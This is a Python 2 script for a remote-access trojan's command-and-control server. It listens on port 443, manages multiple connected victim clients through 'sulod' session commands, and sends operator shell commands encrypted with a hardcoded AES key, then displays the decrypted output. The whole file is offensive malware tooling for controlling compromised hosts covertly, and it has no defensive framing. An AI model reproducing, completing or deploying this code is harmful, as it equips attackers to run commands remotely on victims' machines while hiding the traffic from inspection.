import socket, select, sys, Queue, string, random
from Crypto.Cipher import AES

#Create data type for all connected clients
class clientSock():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	id = 0

#initialize socket
listenip = "0.0.0.0"
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.setblocking(0)
server.bind((listenip, 443))
server.listen(5)

#initialize encryption
iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)
#Create list of socket queues
incoming = [server, sys.stdin]
listclient = []
cnt = 0;
disSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
newsock = clientSock()
sys.stdout.write("\nshell#")
sys.stdout.flush()
try:
  	# loop to accept all incoming socket.connect 
	while incoming:
		cmd =''
		#wait for I/O from the OS
		read, write, err = select.select(incoming, [], [])
		for IO in read:
			#if socket connection is read
			if IO is server:
				disSock, addr = server.accept()
				disSock.setblocking(0)
				#add client socket to incoming and message queue
				newsock = clientSock()
				newsock.sock = disSock
				newsock.id = cnt
				listclient.append(newsock)
				incoming.append(disSock)
				cnt += 1
				sys.stdout.write("\n" + str(disSock.getpeername()) + "shell#")
				sys.stdout.flush()
			#if data is read
			elif IO is sys.stdin:
				cmd = sys.stdin.readline()
				#lists all connected client
				if cmd == 'sulod -l\n':
					for listsock in listclient:
						sys.stdout.write("\n" + str(listsock.id))
				#exit
				elif cmd == 'exit\n':
					sys.exit()
				#enter into client session
				elif cmd.find("sulod -i") >= 0:
					cmd = cmd.lstrip("sulod -i ")
					#print (cmd)
					for listsock in listclient:
						if (str(listsock.id) == cmd.rstrip()):
							print cmd
							disSock = listsock.sock
							newsock = listsock
				#send command to client
				else:
					if (len(cmd) % 16 != 0):
                                                cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
					cmd = ncrypt.encrypt(cmd)
					disSock.send(cmd)
				
				try:
                                        sys.stdout.write("\n" + str(disSock.getpeername()) +"shell#")
                                except:
                                        sys.stdout.write("\nshell#")

				sys.stdout.flush()
			else:
				data = disSock.recv(4096)
				#if client is sending data
				if (data):
					data = ncrypt.decrypt(data)
					data = data.rstrip()
					sys.stdout.write("\n" + data)
 					sys.stdout.write("\n" + str(disSock.getpeername()) + "shell#")
				#if client is disconnected
				elif (not data):
					incoming.remove(disSock)
		                        listclient.remove(newsock)
                		        disSock.close()
					
                                sys.stdout.flush()
		for sock in err:
			incoming.remove(sock)
			listclient.remove(newsock)
			sock.close()

except Exception as e:
	print (e)
